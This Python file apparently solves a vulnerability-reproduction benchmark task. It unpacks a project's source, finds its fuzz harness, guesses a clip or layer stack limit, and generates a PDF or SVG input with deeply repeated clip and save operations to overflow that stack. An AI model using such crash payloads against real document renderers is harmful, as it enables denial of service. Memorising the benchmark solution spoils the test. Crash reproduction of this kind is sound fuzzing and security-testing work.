import os
import re
import tarfile
import tempfile
import zlib
from typing import List, Optional, Tuple


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inl", ".ipp",
    ".m", ".mm", ".rs", ".go", ".java", ".py", ".js", ".ts",
}
_MAX_SCAN_BYTES = 2 * 1024 * 1024


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    if b"\x00" in data:
        return False
    sample = data[:4096]
    bad = 0
    for b in sample:
        if b in (9, 10, 13):
            continue
        if b < 32 or b == 127:
            bad += 1
    return bad * 100 < len(sample) * 5


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for m in tar.getmembers():
        name = m.name
        if not name or name.startswith("/") or name.startswith("\\"):
            continue
        dest = os.path.realpath(os.path.join(path, name))
        if not (dest == base or dest.startswith(base + os.sep)):
            continue
        tar.extract(m, path=path)


def _maybe_unpack(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    td = tempfile.mkdtemp(prefix="src_")
    with tarfile.open(src_path, "r:*") as tf:
        _safe_extract_tar(tf, td)
    # If tarball has a single top-level directory, use it as root
    try:
        entries = [e for e in os.listdir(td) if e not in (".", "..")]
        if len(entries) == 1:
            root = os.path.join(td, entries[0])
            if os.path.isdir(root):
                return root
    except Exception:
        pass
    return td


def _walk_files(root: str) -> List[str]:
    out = []
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in {".git", ".svn", ".hg", "out", "build", "cmake-build-debug", "cmake-build-release"}:
            dirnames[:] = []
            continue
        # prune some common large dirs
        pruned = []
        for d in dirnames:
            if d in {".git", ".svn", ".hg", "out", "build", "dist", "node_modules", "target"}:
                continue
            pruned.append(d)
        dirnames[:] = pruned
        for fn in filenames:
            out.append(os.path.join(dirpath, fn))
    return out


def _read_file_head(path: str, max_bytes: int = _MAX_SCAN_BYTES) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(max_bytes)
    except Exception:
        return b""


def _find_fuzzer_sources(root: str) -> List[str]:
    files = _walk_files(root)
    candidates = []
    needle = b"LLVMFuzzerTestOneInput"
    for p in files:
        ext = os.path.splitext(p)[1].lower()
        if ext not in _TEXT_EXTS:
            continue
        data = _read_file_head(p)
        if needle in data:
            candidates.append(p)
    # prioritize ones with clip/layer/pdf/svg keywords in name/content
    def score(p: str) -> int:
        s = 0
        lp = p.lower()
        for k in ("clip", "layer", "pdf", "svg", "xps", "canvas", "gfx", "render"):
            if k in lp:
                s += 5
        data = _read_file_head(p, 512 * 1024)
        dl = data.lower()
        for k in (b"clip", b"layer", b"%pdf", b"svg", b"xml", b"mupdf", b"qpdf", b"poppler", b"pdfium"):
            if k in dl:
                s += 2
        return -s

    candidates.sort(key=score)
    return candidates


def _find_dict_files(root: str) -> List[str]:
    files = _walk_files(root)
    out = []
    for p in files:
        if p.lower().endswith(".dict"):
            out.append(p)
    return out


def _extract_dict_tokens(dict_bytes: bytes) -> List[bytes]:
    # libFuzzer dict format often has "TOKEN"
    tokens = []
    for m in re.finditer(rb'"([^"\r\n]{1,200})"', dict_bytes):
        tokens.append(m.group(1))
    return tokens


def _infer_input_type(root: str, fuzzer_paths: List[str], dict_paths: List[str]) -> Tuple[str, bool]:
    # returns (type, expects_full_doc)
    # type in {"pdf","svg","unknown"}
    dict_tokens = []
    for dp in dict_paths[:5]:
        data = _read_file_head(dp, 512 * 1024)
        if data:
            dict_tokens.extend(_extract_dict_tokens(data))

    dtl = b"\n".join(dict_tokens).lower()
    if b"%pdf" in dtl or b"endobj" in dtl or b"xref" in dtl or b"stream" in dtl:
        return "pdf", True
    if b"<svg" in dtl or b"</svg" in dtl or b"clip-path" in dtl or b"xmlns" in dtl:
        return "svg", True

    # Examine best fuzzer source
    fp = fuzzer_paths[0] if fuzzer_paths else ""
    data = _read_file_head(fp, 1024 * 1024) if fp else b""
    dl = data.lower()

    if b"<svg" in dl or b"svg" in dl and (b"xml" in dl or b"dom" in dl):
        return "svg", True

    if b"%pdf" in dl or b"pdf" in dl:
        # Decide whether it expects a full PDF document or just a content stream
        full_doc_markers = (
            b"open_document", b"load_document", b"pdfdoc", b"fz_open_document", b"qpdf",
            b"pdfium", b"poppler", b"xref", b"trailer", b"catalog", b"/type /catalog",
        )
        content_only_markers = (
            b"content stream", b"parse_content", b"run_content", b"interpret_content",
            b"contents only", b"process_contents",
        )
        if any(m in dl for m in full_doc_markers):
            return "pdf", True
        if any(m in dl for m in content_only_markers):
            return "pdf", False
        # Most PDF fuzzers take full documents
        return "pdf", True

    # Fall back based on source keywords elsewhere
    return "pdf", True


def _find_relevant_source_snippets(root: str, max_files: int = 20) -> List[str]:
    needles = [
        b"clip mark", b"clip_mark", b"clipmark",
        b"layer/clip", b"layer clip", b"layer_clip",
        b"layerclip", b"clip stack", b"clip_stack",
    ]
    files = _walk_files(root)
    rel = []
    for p in files:
        ext = os.path.splitext(p)[1].lower()
        if ext not in _TEXT_EXTS:
            continue
        data = _read_file_head(p, 1024 * 1024)
        if not data or not _is_probably_text(data):
            continue
        dl = data.lower()
        if any(n in dl for n in needles):
            rel.append(p)
            if len(rel) >= max_files:
                break
    return rel


def _guess_stack_capacity_from_files(paths: List[str]) -> Optional[int]:
    nums = []
    for p in paths:
        data = _read_file_head(p, 1024 * 1024)
        if not data:
            continue
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            continue
        for line in text.splitlines():
            ll = line.lower()
            if ("stack" not in ll) or not (("clip" in ll) or ("layer" in ll) or ("nest" in ll) or ("depth" in ll)):
                continue
            m = re.search(r"\[\s*(\d{2,7})\s*\]", line)
            if m:
                v = int(m.group(1))
                if 2 <= v <= 1000000:
                    nums.append(v)
                    continue
            # std::array<..., N> or template parameter
            m = re.search(r"array\s*<[^>]*,\s*(\d{2,7})\s*>", line)
            if m:
                v = int(m.group(1))
                if 2 <= v <= 1000000:
                    nums.append(v)
                    continue
            # defines / constexpr / const
            m = re.search(r"\b(?:kMax|MAX|LIMIT|SIZE|CAPACITY|DEPTH)\w*\s*(?:=|\s)\s*(\d{2,7})\b", line)
            if m:
                v = int(m.group(1))
                if 2 <= v <= 1000000:
                    nums.append(v)
                    continue
    if not nums:
        return None
    # choose the most plausible (often large-ish, but not absurd)
    nums.sort()
    # prefer values around 256..131072 if present
    for target_low, target_high in ((1000, 200000), (200, 400000), (2, 1000000)):
        cand = [n for n in nums if target_low <= n <= target_high]
        if cand:
            return max(cand)
    return max(nums)


def _guess_pdf_trigger_op(root: str, relevant_files: List[str]) -> str:
    # returns "q" or "W"
    # Heuristic: if push_*clip*mark is tied to save/restore/q, use q; else use W.
    # Find an identifier like push_clip_mark or PushClipMark
    ident = None
    for p in relevant_files:
        data = _read_file_head(p, 1024 * 1024)
        if not data:
            continue
        if not _is_probably_text(data):
            continue
        m = re.search(rb"\b(push\w*clip\w*mark\w*)\b", data, flags=re.IGNORECASE)
        if m:
            ident = m.group(1).decode("ascii", errors="ignore")
            if ident:
                break

    if not ident:
        # fallback: scan for "q" mention with clip mark
        for p in relevant_files:
            data = _read_file_head(p, 512 * 1024).lower()
            if b"clip mark" in data and (b"case 'q'" in data or b" op_q" in data or b" save" in data):
                return "q"
        return "W"

    # Find call sites of ident across repo (limited)
    call_paths = []
    files = _walk_files(root)
    needle = ident.encode("ascii", errors="ignore") + b"("
    for p in files:
        ext = os.path.splitext(p)[1].lower()
        if ext not in _TEXT_EXTS:
            continue
        data = _read_file_head(p, 1024 * 1024)
        if needle in data:
            call_paths.append(p)
            if len(call_paths) >= 15:
                break

    for p in call_paths:
        data = _read_file_head(p, 1024 * 1024)
        if not data:
            continue
        dl = data.lower()
        idx = dl.find(needle.lower())
        if idx < 0:
            continue
        window = dl[max(0, idx - 400): idx + 200]
        if b"case 'q'" in window or b" op_q" in window or b" save" in window or b"gsave" in window:
            return "q"
        if b"case 'w'" in window or b" clip" in window:
            return "W"

    # If any relevant file suggests save/restore semantics with clip mark, choose q
    for p in relevant_files:
        data = _read_file_head(p, 512 * 1024).lower()
        if b"clip mark" in data and (b"save" in data or b"restore" in data or b"gsave" in data):
            return "q"

    return "W"


def _build_pdf_with_single_stream(stream_data: bytes, compress: bool = True) -> bytes:
    if compress:
        comp = zlib.compress(stream_data, level=9)
        dict_part = f"<< /Length {len(comp)} /Filter /FlateDecode >>".encode("ascii")
        payload = comp
    else:
        dict_part = f"<< /Length {len(stream_data)} >>".encode("ascii")
        payload = stream_data

    parts = []
    parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

    offsets = [0]  # placeholder for obj 0

    def add_obj(objnum: int, body: bytes) -> None:
        offsets.append(sum(len(x) for x in parts))
        parts.append(f"{objnum} 0 obj\n".encode("ascii"))
        parts.append(body)
        if not body.endswith(b"\n"):
            parts.append(b"\n")
        parts.append(b"endobj\n")

    add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
    add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
    add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\n")

    obj4 = b"".join([
        dict_part,
        b"\nstream\n",
        payload,
        b"\nendstream\n",
    ])
    add_obj(4, obj4)

    xref_pos = sum(len(x) for x in parts)
    xref = []
    xref.append(b"xref\n")
    xref.append(b"0 5\n")
    xref.append(b"0000000000 65535 f \n")
    for i in range(1, 5):
        xref.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
    xref_bytes = b"".join(xref)
    parts.append(xref_bytes)

    trailer = b"".join([
        b"trailer\n",
        b"<< /Size 5 /Root 1 0 R >>\n",
        b"startxref\n",
        f"{xref_pos}\n".encode("ascii"),
        b"%%EOF\n",
    ])
    parts.append(trailer)

    return b"".join(parts)


def _build_pdf_content_payload(op: str, n: int) -> bytes:
    if op == "q":
        return b"q\n" * n
    # default W path clip
    return b"0 0 1 1 re W n\n" * n


def _build_svg_payload(n: int) -> bytes:
    # Keep tags short-ish. Deep nesting with repeated clip-path usage.
    head = b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n'
    defs = b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>\n'
    open_g = b'<g clip-path="url(#c)">\n'
    close_g = b"</g>\n"
    # Put a tiny element inside to keep structure valid
    inner = b'<rect width="1" height="1"/>\n'
    return b"".join([
        head,
        defs,
        open_g * n,
        inner,
        close_g * n,
        b"</svg>\n",
    ])


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _maybe_unpack(src_path)

        fuzzer_paths = _find_fuzzer_sources(root)
        dict_paths = _find_dict_files(root)
        input_type, expects_full_doc = _infer_input_type(root, fuzzer_paths, dict_paths)

        relevant = _find_relevant_source_snippets(root, max_files=20)
        cap = _guess_stack_capacity_from_files(relevant) if relevant else None

        if cap is None:
            # Reasonable default that likely exceeds common 16-bit-ish or fixed buffer limits
            n = 80000
        else:
            # exceed capacity; avoid absurd sizes
            n = cap + 16
            if n < 1024:
                n = 4096
            if n > 200000:
                n = 200000

        if input_type == "svg":
            # SVG payload is uncompressed; keep it moderate
            if n > 60000:
                n = 60000
            return _build_svg_payload(n)

        # PDF or unknown: craft PDF content/stream
        op = _guess_pdf_trigger_op(root, relevant)
        content = _build_pdf_content_payload(op, n)

        # If unsure, append an alternate trigger (cheap) after the main one
        if op != "q":
            content += (b"q\n" * min(n, 120000))

        if expects_full_doc:
            return _build_pdf_with_single_stream(content, compress=True)
        else:
            return content